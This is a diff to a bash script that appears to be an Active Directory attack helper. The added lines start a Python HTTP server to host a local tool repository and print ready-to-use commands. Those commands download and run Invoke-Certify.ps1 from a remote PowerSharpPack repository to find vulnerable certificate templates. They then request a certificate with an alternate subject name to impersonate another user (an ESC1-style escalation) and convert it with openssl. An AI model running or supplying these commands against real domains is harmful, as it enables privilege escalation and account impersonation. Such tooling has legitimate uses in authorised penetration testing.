@@ -294,17 +294,30 @@ echo -e ""
 
 read -p "Enter Local IP to use: " LocalIP && read -p "Enter Local Port to use: " LocalPort
 echo -e ""
-echo -e "The following variables have been set:"
-
+echo -e "${YELLOW}The following variables have been set${RESTORE}"
 echo -ne "
-
 LocalIP		:	$LocalIP
 LocalPort	:	$LocalPort
-
 "
 
+echo -e "${YELLOW}Checking if Repositories are updated${RESTORE}"
+
 Function_LocalRepo
+
+echo -e "${LGREEN}Repositories are up to date${RESTORE}"
+
+echo -e "${YELLOW}Starting Python server${RESTORE}"
+sleep 3s
+echo -e ""
+echo -e ""
+echo -e "Python server starting on http://$LocalIP:$LocalPort"
+
+python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
+
+sleep 2s
+
 echo -ne "
+
             Return to previous menu?
                  	
         Q) -> Previous Menu
@@ -500,8 +513,22 @@ echo -e ""
 echo -e ""      
 echo -e "${LGREEN}Certificate Services${RESTORE}"
 echo -e ""
+echo -e "${LGREEN}Enumerate Vulnerable Templates${RESTORE}"
+echo -e "${YELLOW}Find vulnerable templates using default low-privileged group${RESTORE}"
 echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Certify.ps1);Invoke-Certify find /vulnerable"
-
+echo -e  ""
+echo -e "${YELLOW}Find vulnerable templates using all groups the current user context is a part of${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Certify.ps1);Invoke-Certify find /vulnerable /currentuser"
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Request Vulnerable Templates (Choose One)${RESTORE}"
+echo -e ""
+echo -e "${YELLOW}EC1 SubjectAltName (SAN)${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"PowerSharpBinaries/Invoke-Certify.ps1);Invoke-Certify request /ca:[CA Name] /template:[Template Name] /altname:[User]"
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Once requested convert on Unix device${RESTORE}"
+echo -e "openssl pkcs12 -in cert.pem -keyex -CSP "\"Microsoft Enhanced Cryptographic Provider v1.0"\" -export -out cert.pfx"
 }
 
 
